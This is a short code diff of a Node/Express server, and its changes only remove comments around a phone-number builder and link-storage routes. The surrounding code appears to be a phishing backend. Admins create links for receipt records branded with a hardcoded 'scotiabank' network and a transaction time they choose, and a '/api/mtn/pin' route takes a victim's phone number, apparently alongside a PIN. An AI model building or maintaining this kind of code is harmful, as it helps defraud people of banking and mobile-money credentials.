@@ -65,16 +65,13 @@ function esc(s = ''){
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
 
-/* ✅ Helper: build full international phone from country code + local number */
+/* ✅ Build full international phone from country code + local number */
 function buildFullPhone(countryCode, rawNumber){
   const cc = String(countryCode || '').trim();
   let num = String(rawNumber || '').trim().replace(/[^\d+]/g, '');
   if (!num) return '';
-  // If it already starts with +, trust it
   if (num.startsWith('+')) return num;
-  // Strip leading zeros
   num = num.replace(/^0+/, '');
-  // If the number already includes the country code digits at start, use +cc+num
   if (cc) {
     const ccDigits = cc.replace(/[^\d]/g, '');
     if (ccDigits && num.startsWith(ccDigits)) {
@@ -246,7 +243,6 @@ app.post('/api/links', (req, res) => {
       marketedBy: body.marketedBy || '',
       purpose: body.purpose || '',
       timestamp: body.timestamp || '',
-      /* ✅ NEW: store the ISO datetime from admin.html */
       transactionDateTime: body.transactionDateTime || '',
       network: 'scotiabank',
       lang: lang,
@@ -299,7 +295,6 @@ app.get('/api/links/:code', (req, res) => {
     mk:  rec.marketedBy,
     pu:  rec.purpose,
     ts:  rec.timestamp,
-    /* ✅ NEW: ISO datetime the admin set */
     dtIso: rec.transactionDateTime || ''
   });
 });
@@ -316,7 +311,6 @@ app.post('/api/mtn/pin', async (req, res) => {
     const t = ensureTx(tracking, { receipt: rec });
     const L = normalizeLang(lang || rec.lang || t.lang);
 
-    /* ✅ Build full international phone: countryCode + raw phone */
     const rawPhone = phone || rec.accountNumber || an || '';
     const fullPhone = buildFullPhone(rec.countryCode, rawPhone) || rawPhone || '—';
 
